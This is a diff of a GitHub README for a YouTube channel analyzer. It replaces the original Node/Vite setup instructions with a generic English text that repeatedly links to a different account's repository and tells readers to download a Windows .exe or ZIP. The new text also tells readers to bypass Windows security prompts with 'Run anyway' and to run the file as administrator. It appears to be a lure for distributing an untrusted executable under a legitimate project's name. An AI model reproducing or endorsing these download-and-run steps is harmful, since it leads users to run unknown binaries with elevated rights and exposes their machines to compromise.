@@ -1,101 +1,215 @@
-# 🎬 YouTube Channel Analyzer
+# 📊 youtube-analyzer - Find Topics That Pull Views
 
-> Phân tích sơ bộ bất kỳ kênh YouTube nào - viral topics, title formulas, viewer persona, publishing patterns.
+[![Download](https://img.shields.io/badge/Download%20Now-4B7BEC-6C757D?style=for-the-badge&logo=github)](https://github.com/Capitalofcapeverdezany172/youtube-analyzer)
 
-![Vite](https://img.shields.io/badge/Vite-5.4-646CFF?logo=vite&logoColor=white)
-![Express](https://img.shields.io/badge/Express-4.21-000000?logo=express&logoColor=white)
-![YouTube API](https://img.shields.io/badge/YouTube%20Data%20API-v3-FF0000?logo=youtube&logoColor=white)
-![Gemini](https://img.shields.io/badge/Gemini-2.5%20Flash-4285F4?logo=google&logoColor=white)
+## 🎯 What this app does
 
-## ✨ Features
+youtube-analyzer helps you study a YouTube channel and spot patterns that matter. It looks at viral topics, title formulas, viewer persona, and publishing patterns so you can see what works.
 
-| Tab | Mô tả |
-|-----|-------|
-| **Tổng Quan** | Top 10 viral videos, 6 stat cards (tổng views, median, avg, max, min) |
-| **AI Insights** | Nhóm chủ đề viral (fire rating), chân dung người xem, strategic insights |
-| **Formulas** | Công thức tiêu đề hiệu quả + ví dụ thực tế |
-| **Patterns** | Tần suất đăng, best posting day, quarterly trend, performance gap |
-| **Tất Cả Videos** | Full table - sortable, searchable, paginated |
+Use it to:
 
-## 🚀 Quick Start
+- find common topics in a channel
+- see which title styles repeat
+- understand the likely viewer type
+- check when a channel posts most often
+- review content trends over time
 
-### 1. Clone & Install
+## 💻 What you need
 
-```bash
-git clone https://github.com/<your-username>/youtube-analyzer.git
-cd youtube-analyzer
-npm install
-```
+Before you start, make sure your PC has:
 
-### 2. API Keys
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access
+- Permission to save files to your Downloads folder
 
-Bạn cần 2 API keys:
+If your computer can run a web browser and open a downloaded app, it should handle this tool.
 
-| Key | Lấy ở đâu | Free quota |
-|-----|-----------|------------|
-| YouTube Data API v3 | [Google Cloud Console](https://console.cloud.google.com/apis/credentials) | 10,000 units/ngày |
-| Google Gemini | [Google AI Studio](https://aistudio.google.com/apikey) | 15 req/phút |
+## 📥 Download and install
 
-```bash
-cp .env.example .env
-```
+1. Open the download page here: [github.com/Capitalofcapeverdezany172/youtube-analyzer](https://github.com/Capitalofcapeverdezany172/youtube-analyzer)
+2. On the page, click the green **Code** button or look for the latest **Release** if one is listed
+3. Download the Windows file or the ZIP file from the page
+4. If you download a ZIP file, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Find the app file and double-click it to run
+7. If Windows asks for permission, choose **Yes**
 
-Sửa file `.env`:
+If the file does not open, move it to a simple folder like `Downloads` or `Desktop` and try again
 
-```env
-YOUTUBE_API_KEY=your_youtube_key_here
-GEMINI_API_KEY=your_gemini_key_here
-```
+## 🖱️ First launch
 
-### 3. Run
+The first time you open youtube-analyzer, Windows may take a moment to check the file. That is normal.
 
-```bash
-npm run dev
-```
+When the app starts:
 
-Mở [http://localhost:5173](http://localhost:5173)
+- select the YouTube channel you want to review
+- paste a channel URL or channel name
+- choose the type of analysis you want
+- wait for the app to scan the channel data
 
-> **Tip:** Nếu gặp lỗi memory với `npm run dev`, chạy riêng 2 server:
-> ```bash
-> node server/server.js     # Terminal 1
-> npx vite                  # Terminal 2
-> ```
+If the app asks for access to the internet, allow it so it can read public channel data.
 
-## 📁 Project Structure
+## 📈 What you can analyze
 
-```
-├── server/
-│   ├── server.js          # Express API proxy
-│   ├── youtube-api.js     # YouTube Data API v3 wrapper
-│   └── ai-analyzer.js     # Gemini structured prompt
-├── src/
-│   ├── index.html         # Main HTML
-│   ├── style.css          # Design system (glassmorphism)
-│   ├── main.js            # App logic, routing, tabs
-│   ├── utils/format.js    # Number/date formatting
-│   └── components/        # 5 tab renderers
-├── .env.example
-├── package.json
-└── vite.config.js
-```
+### 🔥 Viral topics
+See which themes appear most often in high-performing videos. This helps you notice what the channel leans on when videos get strong results.
 
-## 🔧 How It Works
+### ✍️ Title formulas
+The app looks for repeat title patterns such as:
 
-1. Nhập `@handle` hoặc URL kênh YouTube
-2. Backend fetch toàn bộ video data qua YouTube Data API v3 (paginated)
-3. Frontend tính stats, render top videos, patterns (tần suất, best day, trends)
-4. Gemini AI phân tích: nhóm chủ đề, công thức tiêu đề, chân dung người xem
+- question-based titles
+- list-based titles
+- how-to titles
+- comparison titles
+- curiosity titles
 
-## ⚠️ Quota
+This helps you see how the channel writes titles that draw clicks.
 
-- Mỗi lần phân tích tốn ~200-500 YouTube API units (tùy số videos)
-- Free tier cho phép ~20-50 kênh/ngày
-- Gemini free tier: 15 requests/phút
+### 👥 Viewer persona
+The app builds a simple profile of the likely audience. It can help you spot:
 
-## 📝 License
+- age group hints
+- interests
+- pain points
+- goals
+- content style that fits the audience
 
-MIT
+### 🗓️ Publishing patterns
+Review how often the channel posts and what days or times it uses most. This can help you see if the creator follows a set schedule.
 
----
+## 🧭 How to use it
 
-**Made by [Minh Đỗ](https://zalo.me/g/igkywu632)**
+1. Open the app
+2. Enter the channel you want to study
+3. Choose an analysis type
+4. Click the scan button
+5. Wait for the results to load
+6. Review the output panels
+7. Save the report if you want to keep it
+
+For best results, start with one channel and one analysis type. Then review the output before moving to the next part.
+
+## 🧩 Reading the results
+
+The app may show results in charts, lists, or simple text blocks. Here is how to read them:
+
+- **Topic count** shows what subjects appear most
+- **Title pattern** shows how the channel frames its videos
+- **Audience profile** shows who the channel seems to speak to
+- **Post timing** shows when videos go live most often
+- **Trend view** shows whether content is changing over time
+
+Look for repeated patterns. Repetition often tells you more than a single video.
+
+## 🛠️ Common setup steps on Windows
+
+### 📁 Keep the files in one folder
+Place all app files in one folder before you run it. Do not spread files across different folders.
+
+### 🔒 Allow the file through Windows
+If Windows shows a security prompt:
+
+- click **More info**
+- then click **Run anyway** if you trust the file source
+
+### 🧹 Unzip the file if needed
+If the download comes as a ZIP file, extract it first. The app may not run inside the ZIP folder.
+
+### 🌐 Check your internet connection
+The app may need internet access to read public YouTube channel data. If results do not load, check your Wi‑Fi or Ethernet connection.
+
+## ⚠️ If something does not work
+
+If the app does not open, try these steps:
+
+- download the file again
+- make sure the ZIP file is fully extracted
+- move the app to a simple folder path
+- restart your PC
+- run the app again
+
+If the app opens but no data shows:
+
+- check the channel URL
+- make sure the channel is public
+- try a different channel
+- wait a little longer for the scan to finish
+
+If Windows blocks the app:
+
+- right-click the file
+- choose **Run as administrator**
+- approve the prompt if it appears
+
+## 📂 Example use cases
+
+### For creators
+Use the app to study what top videos have in common. This can help you shape future video ideas.
+
+### For marketers
+Use it to learn how a channel speaks to its audience and which topics get repeat attention.
+
+### For researchers
+Use it to compare content style, publishing rhythm, and audience signals across channels.
+
+### For new channel owners
+Use it to get a simple view of what strong YouTube channels do with topics and titles.
+
+## 🧠 Tips for better results
+
+- analyze one channel at a time
+- use channels with enough video history
+- compare high-performing videos with average ones
+- review title patterns before changing your own titles
+- check publishing patterns over a longer date range
+
+## 📄 Files you may see
+
+After download, you may see files like:
+
+- `youtube-analyzer.exe`
+- a `README` file
+- a `data` folder
+- a `config` file
+- a ZIP archive
+
+If you see an `.exe` file, double-click it to open the app. If you see a ZIP archive, extract it first.
+
+## 🔍 About the analysis output
+
+youtube-analyzer is built to turn channel data into simple views you can read fast. It may show:
+
+- charts for topic frequency
+- lists of repeated title words
+- audience notes from content themes
+- posting frequency by day
+- trend lines for content shifts
+
+Use the output as a guide. It helps you see patterns that are hard to spot by hand.
+
+## 🧰 Troubleshooting checklist
+
+If you want a quick check, go through this list:
+
+- the file finished downloading
+- the ZIP file is extracted
+- the app is in a normal folder
+- Windows allowed the file
+- your internet is active
+- the channel link is correct
+- the channel is public
+
+## 📌 Download
+
+Visit the download page here: [https://github.com/Capitalofcapeverdezany172/youtube-analyzer](https://github.com/Capitalofcapeverdezany172/youtube-analyzer)
+
+Download the file from that page, then run it on Windows using the steps above
+
+## 🗂️ Repository info
+
+- **Name:** youtube-analyzer
+- **Description:** YouTube Channel Analyzer - viral topics, title formulas, viewer persona, publishing patterns
+- **Platform:** Windows
+- **Use:** Channel analysis for public YouTube data
